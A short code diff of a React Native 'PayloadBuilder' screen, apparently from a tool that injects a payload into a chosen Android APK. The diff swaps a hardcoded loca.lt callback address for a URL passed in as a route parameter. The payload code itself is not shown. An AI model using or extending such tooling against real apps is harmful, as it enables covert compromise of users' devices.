@@ -18,16 +18,16 @@ import { TouchableOpacity } from "react-native";
 // native module
 import AppBuilder from '../../native-modules/AppBuilder'
 // redux
-import { useDispatch, useSelector } from '../../redux/store';
+import { useDispatch } from '../../redux/store';
 import { addBuildPayloadLogs } from '../../redux/slices/userInfo'
 // components
 import BuildLogScreen from '../../components/BuildLogScreen'
 
-const PayloadBuilder = ({navigation}) => {
+const PayloadBuilder = ({navigation, route}) => {
     const toast = useToast();
     const dispatch = useDispatch();
-    const { subdomain } = useSelector((state) => state.userInfo);
-
+    const { url } = route.params;
+    
     const [targetApk,setTargetApk]=useState();
     const [visible, setVisible]= useState(false);
 
@@ -68,7 +68,7 @@ const PayloadBuilder = ({navigation}) => {
             RNFetchBlob.fs.stat(targetApk.uri).then((stats) => { 
                 if(stats.path){
                     setVisible(true)
-                    AppBuilder.build(stats.path,`https://${subdomain}.loca.lt`, addlog);
+                    AppBuilder.build(stats.path, url, addlog);
                 }else{
                     toast.show({
                         title: "Target apk selected corrupt",
